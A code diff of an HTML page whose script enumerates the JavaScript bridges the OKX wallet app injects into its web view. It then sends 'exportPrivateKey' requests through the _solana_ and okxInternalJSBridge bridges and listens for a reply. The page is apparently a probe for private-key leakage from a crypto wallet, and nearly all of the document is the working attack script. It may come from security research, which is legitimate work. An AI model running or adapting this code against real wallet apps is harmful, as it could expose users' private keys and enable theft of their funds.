@@ -1,54 +1,86 @@
-<html><body style="background:#1a1a2e;color:#fff;font-family:monospace;padding:20px">
-<h2>Bridge Detail</h2>
+<html><body style="background:#1a1a2e;color:#fff;font-family:monospace;padding:20px;font-size:13px">
+<h2>One-Time Full Scan</h2>
 <pre id="d" style="color:#0f0"></pre>
 <script>
-var d=document.getElementById('d');
-function log(m){d.textContent+=m+'\n';}
-
-function dumpBridge(name, obj) {
-  log('=== ' + name + ' ===');
-  if(!obj) { log('  undefined'); return; }
+(function(){
+  var d=document.getElementById('d');
+  var log = [];
+  function l(m){log.push(m); d.textContent=log.join('\n');}
   
-  // 所有属性 (包括非函数)
-  var props = Object.getOwnPropertyNames(obj);
-  log('  Properties (' + props.length + '):');
-  props.forEach(function(p) {
+  l('=== BRIDGE DUMP ===');
+  
+  var bridges = ['_solana_','okxInternalJSBridge','_aptos_','_okx_sui_','okxBtcJSBridge',
+                 'okxNostrJSBridge','okxOsmosJSBridge','okxStarkJSBridge','okxTonJSBridge',
+                 'okxInternalProvider','okexchain','tron'];
+  
+  bridges.forEach(function(name){
+    var obj = window[name];
+    if(!obj) return;
+    l('\n--- ' + name + ' ---');
     try {
-      var val = obj[p];
-      var t = typeof val;
-      var s = '  ' + p + ': ' + t;
-      if(t === 'string') s += ' = "' + val.substring(0,80) + '"';
-      else if(t === 'number') s += ' = ' + val;
-      else if(t === 'function') s += ' (args: ' + val.length + ')';
-      else if(t === 'object' && val) {
-        try { s += ' keys: ' + Object.keys(val).join(','); } catch(e){}
-      }
-      log(s);
-    } catch(e) {
-      log('  ' + p + ': [error: ' + e.message + ']');
-    }
+      var allProps = [];
+      for(var p in obj) allProps.push(p);
+      Object.getOwnPropertyNames(obj).forEach(function(p){
+        if(allProps.indexOf(p)<0) allProps.push(p);
+      });
+      allProps.forEach(function(p){
+        try {
+          var val = obj[p];
+          var t = typeof val;
+          if(t==='function') {
+            l('  fn ' + p + '(' + val.length + ' args)');
+          } else if(t==='string') {
+            l('  str ' + p + ' = "' + val.substring(0,60) + '"');
+          } else if(t==='number' || t==='boolean') {
+            l('  ' + t + ' ' + p + ' = ' + val);
+          } else if(t==='object' && val) {
+            var info = '  obj ' + p;
+            try { info += ' keys:[' + Object.keys(val).join(',') + ']'; } catch(e){}
+            l(info);
+          } else {
+            l('  ' + t + ' ' + p);
+          }
+        } catch(e){}
+      });
+    } catch(e){l('  error: '+e.message);}
   });
   
-  // 原型链
-  log('  Proto:');
+  // === CALL exportPrivateKey ===
+  l('\n=== CALLING exportPrivateKey ===');
+  var msg = JSON.stringify({method:'exportPrivateKey', params:[''], id:1});
   try {
-    var proto = Object.getPrototypeOf(obj);
-    if(proto) {
-      var protoProps = Object.getOwnPropertyNames(proto);
-      protoProps.forEach(function(p) {
-        if(p !== 'constructor') {
-          try {
-            var v = proto[p];
-            log('    proto.' + p + ': ' + typeof v);
-          } catch(e) {}
-        }
-      });
-    }
-  } catch(e) {}
-}
-
-dumpBridge('_solana_', window._solana_);
-dumpBridge('okxInternalJSBridge', window.okxInternalJSBridge);
-dumpBridge('okxBtcJSBridge', window.okxBtcJSBridge);
-dumpBridge('_aptos_', window._aptos_);
+    _solana_.postMessage(msg);
+    l('_solana_.postMessage sent');
+  } catch(e){l('_solana_ error: '+e.message);}
+  try {
+    okxInternalJSBridge.postMessage(msg);
+    l('okxInternalJSBridge.postMessage sent');
+  } catch(e){l('okxInternalJSBridge error: '+e.message);}
+  
+  // === LISTEN for response ===
+  l('\n=== LISTENING for response (30s) ===');
+  
+  // Method 1: window.addEventListener
+  window.addEventListener('message', function(e){
+    l('[MSG] window received: ' + JSON.stringify(e.data));
+  });
+  
+  // Method 2: document.addEventListener  
+  document.addEventListener('message', function(e){
+    l('[MSG] document received: ' + JSON.stringify(e.data));
+  });
+  
+  // Method 3: check for callback function
+  l('typeof window.callback: ' + typeof window.callback);
+  l('typeof window.onmessage: ' + typeof window.onmessage);
+  
+  // Show what we have after 5s
+  setTimeout(function(){
+    l('\n=== Waiting for response... (check above) ===');
+  }, 5000);
+  
+  setTimeout(function(){
+    l('\n=== SCAN COMPLETE ===');
+  }, 30000);
+})();
 </script></body></html>
